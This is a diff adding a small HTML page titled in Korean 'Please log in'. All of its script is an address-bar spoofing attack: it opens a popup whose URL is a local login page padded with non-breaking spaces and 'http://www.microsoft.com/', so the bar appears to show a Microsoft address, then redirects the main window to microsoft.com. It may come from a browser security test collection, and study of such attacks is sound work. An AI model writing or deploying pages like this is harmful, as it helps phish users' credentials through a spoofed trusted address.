@@ -1,0 +1,21 @@
+<HTML>
+ <head>
+ 	<title>로그인 해 주세요</title>
+ </head>
+ <BODY>
+  <script language="JavaScript">
+	(function()	{
+	 var padding = '';
+	 for ( i=0 ; i<108 ; i++)
+	 {
+		 padding += unescape("%A0");
+	 }
+	 newWindow = window.open("", "Win", "width=300,height=150,scrollbars=yes");
+	 //newWindow.moveTo( (screen.width-325) , 0 );
+	 newWindow.document.location = "login.html?" + unescape("%A0") + unescape("%A0") + "http://www.microsoft.com/"+padding;
+	 document.location = "http://www.microsoft.com/";
+	})();
+</script>
+
+ </BODY>
+</HTML>
